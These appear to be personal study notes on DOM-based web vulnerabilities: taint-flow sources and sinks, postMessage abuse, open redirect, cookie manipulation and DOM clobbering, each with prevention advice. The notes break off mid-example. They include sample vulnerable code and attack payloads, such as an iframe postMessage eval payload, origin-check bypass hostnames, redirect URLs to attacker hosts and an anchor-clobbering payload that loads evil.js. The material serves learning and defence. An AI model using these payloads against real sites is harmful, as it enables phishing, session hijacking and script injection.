DOM (Document Object Model):
- A web browser's hierachical representation of the element on the page
- Can use JS to manipulate the properties, nodes and objects of DOM
- DOM manipulation itself is not a problem, it just integral part of how modern website work
- Vulnerabilities arise when:
    + Handle data insecurely
    + Contain JS that take attacker controllable (source), and pass it into a dangerous function (sink)

Taint-flow vulnerabilities:
- Many can traced back to problems with the way client-side code manipulate input data 

- What is taint flow:
    + Source: JS property that accepts data that is potentially attacker-controlled
        + Example: location.search (read input from query string), document.referer, document.cookie, and web messages,...
    + Sink: potentially danggerous JS function or DOM object that can cause undesirable effects if attacker-controlled data is pass to it.
        + Example: eval() (process argument as JS), document.body.innerHTML (allow inject maliciouse HTML and execute arbitrary JS)
    
- Vuln arise when web pass data from a source to sink in unsafe way.
- Most common source is URL, typically accessed with location object
- Attacker can construct a link to redirect victim to vuln page with payload in query string and fragment portions of URL
    goto = location.hash.slice(1)
    if (goto.startsWith('https:')) {
        location = goto;
    }
    https://www.innocent-website.com/example#https://www.evil-user.net
    + location.hash handled in unsafe way -> vuln to DOM-based open redirection
    + It extract value of 'location.hash' property, set it as 'location' property of 'window'

Controlling the web message source: (1, 2, 3)
- Idea: web messages (postMessage() method) can act as source on page
- Root cause: page handle imcoming web msg in unsafe way:
    + For example, event listener doesn't verify origin correctly
    -> properties and functions that called by that listener can become sink
- Attacker flow:
    + Could host malicious iframe
    + Use postMessage() to send msg data to vuln event listener
    + Then listener send payload to sink on the parent page
- Impact:
    + Depend on destination document's handling of incoming message
    + If destination document trust sender and hanle data in unsafe way, then pass it to sink -> allow attacker compromise the user
- How to construct attack:
    + Example vuln code:
        <script>
            window.addEventListener('message', function(e) {
                eval(e.data);
            });
        </script>
    + Example payload:
        <iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
        + Place this in attacker's server, victim visit -> trigger
        + this -> iframe
        + this.contentWindow -> vuln web
        + '*' -> accept cross-origin
- Origin verification:
    + Even include some form of origin verification, sometimes still can be flawed. Example:
        window.addEventListener('message', function(e) {
            if (e.origin.indexOf('normal-website.com') > -1) {
                eval(e.data);
            }
        });
    + Flaw function:
        + indexOf(), startsWith(): http://www.normal-website.com.evil.net
        + endsWith(): http://www.malicious-websitenormal-website.com


DOM-based open redirect: (4)
- Example vuln code:
    let url = /https?:\/\/.+/.exec(location.hash);
    if (url) { location = url[0]; }
- Example payload: https://vulnerable-site.com/redirect#https://attacker-controlled-site.com
- Impact:
    + Phishing: attacker uses an authentic app url (correct domain + valid TLS cert) that redirect to a malicious site
        -> lend credibility to attack, if not verify, won't notice subsequent redirection to a different domain
    + Escalate into JS injection attack: could contruct with javascript: pseudo-protocol to execute arbitrary code
- Sink can lead to vuln:
    + location, location.host, location.hostname, location.href, location.pathname
    + location.search, location.protocol, location.assign(), location.replace()
    + open(), element.srcdoc
    + XMLHttpRequest.open(), XMLHttpRequest.send()
    + jQuery.ajax(), $.ajax()
- How to prevent:
    + Avoid dynamically setting redirection target using data originated from any untrusted source
    + https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet


DOM-based cookie manipulation: (5)
- Some web transforms normally-safe data type (such as cookies) into potential sources (without sanitizing)
- Attacker could construct URL that if victim visit will set arbitrary value in user's cookie
- Example vuln code:
    document.cookie = 'cookieName='+location.hash.slice(1);
- Impact:
    + Depend on role that cookie play within the website
    + Used to control behavior result from certain user action (such as production or demo mode setting)
    + If used to track user's session -> can perform session fixation attack
        https://owasp.org/www-community/attacks/Session_fixation
        + Set cookie to valid token of attacker -> hijack session during victim's subsequent interaction
        + Can use in other website under same parent domain
- Sink can lead to vuln:
    + document.cookie
- How to prevent: avoid dynamically writing to cookies using data that originated from any untrusted source


DOM clobbering: (6, 7)
- Technique that inject HTML into page to manipulate DOM and ultimately change behavior of JS on page
- Useful when: XSS is not possible, but still possible to control some HTML where attribute 'id' or 'name' are whitelisted by HTML filter
- Most common form: use anchor element to overwrite global var, then used by application in unsafe way (such as generate dynamic script URL)
- How to exploit vuln:
    + Common pattern used by JS dev:
        var someObject = window.someObject || {};
        + If window.someObject exist -> use it, else -> assign {}
    + Example code:
        <script>
            window.onload = function(){
                let someObject = window.someObject || {};
                let script = document.createElement('script');
                script.src = someObject.url;
                document.body.appendChild(script);
            };
        </script>
    + Could inject this payload to clobber (overwrite) the 'someObject' reference:
        <a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
        + 2 anchors use same ID -> group them in a DOM collection or HTML collection
            someObject = HTMLCollection [<a>, <a name=url ...>]
        + script.src = someObject.url need to assign string there. When <a> is force to convert to string -> return value of href
        + id -> collection -> name -> property url -> href

    + Another common technique is to use 'form', 'input' element to clobber DOM
    + Example: clobbering 'attributes' property -> enable bypass client-side filter use in their logic -> can inject malicious attribute that would normally be filtered
        <form onclick=alert(1)><input id=attributes>Click me
    + This case, 'form' is whitelist element. Normally, filter would loop through 'attributes' property of form and remove blacklisted attributes
        + But 'attributes' property has been clobbered with 'input' element -> filter loop though 'input' element instead
        + As 'input' length is undefined, condition (ex: i < element.attributes.length) for loop not met -> filter just simply moves on to next element instead
        -> allow alert() function to be called in browser

- How to prevent DOM clobbering:
    + Check obj and function are legitimate, if filter DOM, make sure that obj of function is not a DOM node
    + Avoid bad code pattern (like using global var in conjunction with logical operator OR ||)
    + Use well-tested library (such as DOMPurify)

How to prevent DOM-based taint-flow vuln:
- There is no single action can take to eliminate threat of DOM-based attack entirely
- Most effective way is avoid allow data from any untrusted source to dynamically value that transmitted to any sink
- If the desired function of application mean that this behavior is unavoidable, then defenses must implemented in client-side code
- Many cases, data can validated on whitelist basis, other cases will necessary to sanitize or encode data

- Notice <script> tag
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);

        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":

                break;
